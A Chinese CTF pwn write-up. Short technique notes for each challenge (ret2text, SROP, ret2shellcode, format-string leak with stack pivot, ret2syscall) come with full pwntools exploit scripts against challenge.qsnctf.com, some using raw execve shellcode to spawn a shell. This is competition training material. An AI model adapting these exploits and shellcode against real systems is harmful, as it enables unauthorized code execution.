# 浅红欺醉粉，肯信有江梅
nc签到题，没什么好说的
nc一下即可
# 领取你的小猫娘
ret2text，让rbp - 0x8的位置不为零即可获取shell
```Python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
local = True
debug = False
if local:
    p = process('./cat')
    if debug:
        gdb.attach(p, gdbscript='b main')
else:
    ip ,port = "challenge.qsnctf.com:32442".split(":")
    p = remote(ip, port)

p.sendline(b'a' * 0x50)

p.interactive()
```
# 当时只道是寻常
非常简单的SROP应用，直接构造一个`frame`在栈上，然后给`rax`赋值并执行`syscall`即可
```Python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
local = True
debug = True
if local:
    p = process('./pwn01')
    if debug:
        gdb.attach(p, gdbscript='b main')
else:
    ip ,port = "challenge.qsnctf.com:32442".split(":")
    p = remote(ip, port)

pop_rax = 0x40104a
binsh = 0x40203a
syscall = 0x40101d

frame1 = SigreturnFrame()
frame1.rax = constants.SYS_execve
frame1.rdi = binsh
frame1.rsi = 0
frame1.rdx = 0
frame1.rip = 0x401045

payload = p64(0)
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(0x401042)
payload += bytes(frame1)
p.send(payload)

p.interactive()
```
# 我觉君非池中物，咫尺蛟龙云雨
ret2shellcode ，构造一段比 0x20 短的shellcode即可
```Python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
local = True
debug = False
if local:
    p = process('./pwn02')
    if debug:
        gdb.attach(p, gdbscript='b main')
else:
    ip ,port = "challenge.qsnctf.com:32442".split(":")
    p = remote(ip, port)

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
p.send(shellcode)

p.interactive()
```
# 铜雀春深锁二乔
格式化字符串漏洞加栈迁移，不明白为什么就是不给libc 2.35
```Python
from pwn import *
from LibcSearcher import *

context(arch="amd64", os="linux", log_level="debug")
local = False
if local:
    p = process("./pwn03")
    # gdb.attach(p)
else:
    ip, port = "challenge.qsnctf.com:31476".split(":")
    p = remote(ip ,port)

offset = 0x30
libc = ELF("./libc.so.6")
elf = ELF("./pwn03")

payload = b"-%11$p-%15$p-%33$p-%1$p-"
p.sendline(payload)
p.recvuntil(b"\n")
recv = p.recvuntil(b'\n').split(b"-")
canary = int(recv[1], 16)
code_base = int(recv[2], 16) - 0x10125b
_rtld_global = int(recv[3], 16) - 128
stack = int(recv[4], 16) + 0x30
log.info('canary: ' + hex(canary))
log.info('stack: ' + hex(stack))
log.info('code_base: ' + hex(code_base))
bss = code_base + 0x1040a0
stack = bss + 0x100

libc_base = _rtld_global - libc.sym['__libc_start_main']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
log.info('libc_base: ' + hex(libc_base))
log.info('binsh: ' + hex(binsh))

pop_rdi = code_base + 0x101245
ret = code_base + 0x10101a
system = libc_base + libc.sym['system']
pop_r12_r13 = 0x41c48 + libc_base
pop_r12 = 0x35731 + libc_base
leave_ret = code_base + 0x101234
gadgets = [0xebc85, 0xebc88, 0xebce2, 0xebd38]

pause()
payload = b'a' * 0x8 + p64(canary) + p64(stack) + b'\xc1'
p.send(payload)
# gdb.attach(p)
payload = flat([
    b'a' * 0x8,
    ret,
    pop_rdi,
    p64(binsh),
    p64(system),
    canary,
    stack - 0x30
    ])
payload = b'a' * 0x8
payload = p64(stack - 0x30) + p64(pop_r12) + p64(0) + p64(libc_base + gadgets[3])
# payload = p64(canary) + p64(pop_rdi) + p64(binsh) + p64(system)
pause()
p.sendline(payload)

pause()
# gdb.attach(p)
payload = b'a' * 0x8 + p64(canary) + p64(stack - 0x30) + p64(leave_ret)
p.send(payload)
p.interactive()
```
# 江南无所有，聊赠一枝春
ret2text
```Python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
local = False
if local:
    p = process("./gift")
    gdb.attach(p, 'b main')
else:
    ip, port = "challenge.qsnctf.com:30912".split(":")
    p = remote(ip ,port)

gift = 0x4011b6
ret = 0x4011ed
offset = 0x40 + 0x8

payload = b'a' * (offset) + p64(ret) + p64(gift)
p.sendline(payload)

p.interactive()
```
# 被酒莫惊春睡重
ret2syscall
```Python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
local = False
if local:
    p = process("./pwn04")
    # gdb.attach(p, 'b main')
else:
    ip, port = "challenge.qsnctf.com:30940".split(":")
    p = remote(ip ,port)

pop_rsi_rdi_rax = 0x4011e1

p.sendline(b"/bin/sh\x00")
p.recvuntil("你好, ")
binsh = int(p.recv(14), 16)
log.info(hex(binsh))
syscall = 0x4011ec
pause()
p.sendline(b'1')
pause()
payload = flat([
    "/bin/sh\x00",
    b'a' * 0x20,
    pop_rsi_rdi_rax,
    0,
    binsh,
    59,
    syscall
    ])
#gdb.attach(p)
p.sendline(payload)
p.interactive()
```
# 赌书消得泼茶香
加密的ret2text
```Python
from pwn import *
import base64

context(arch="amd64", os="linux", log_level="debug")
local = False
if local:
    p = process("./pwn02")
    gdb.attach(p, 'b main')
else:
    ip, port = "challenge.qsnctf.com:31731".split(":")
    p = remote(ip ,port)

def string_to_base64(text):
    # 将字符串编码为 bytes (UTF-8)
    data_bytes = text.encode('utf-8')
    # 转换为 Base64 bytes，再解码为字符串
    base64_str = base64.b64encode(data_bytes).decode('utf-8')
    return base64_str

backdoor = 0x40141d
ret = 0x401436
offset = 0x68

payload = b'a' * offset + p64(ret) + p64(backdoor)
p.sendline(base64.b64encode(payload))

p.interactive()
```
# 萧萧黄叶闭疏窗
```Python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
local = False
if local:
    p = process("./bad")
    debugscript = '''
        b main
        b vuln_func
    '''
    gdb.attach(p, debugscript)
else:
    ip, port = "challenge.qsnctf.com:31957".split(":")
    p = remote(ip ,port)

shellcode = asm(shellcraft.sh())

p.sendline(b"A" * (0x40 + 0x8) + p64(0x4040a0 + 0x50) + shellcode)

p.interactive()
```
# 借的东风破金锁
```Python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
local = False
if local:
    p = process("./key")
    debugscript = '''
        b main
        b vuln_func
    '''
    gdb.attach(p, debugscript)
else:
    ip, port = "challenge.qsnctf.com:32004".split(":")
    p = remote(ip ,port)

auth_code = "FTCUNQS"
p.sendafter("key: ", auth_code)

p.interactive()
```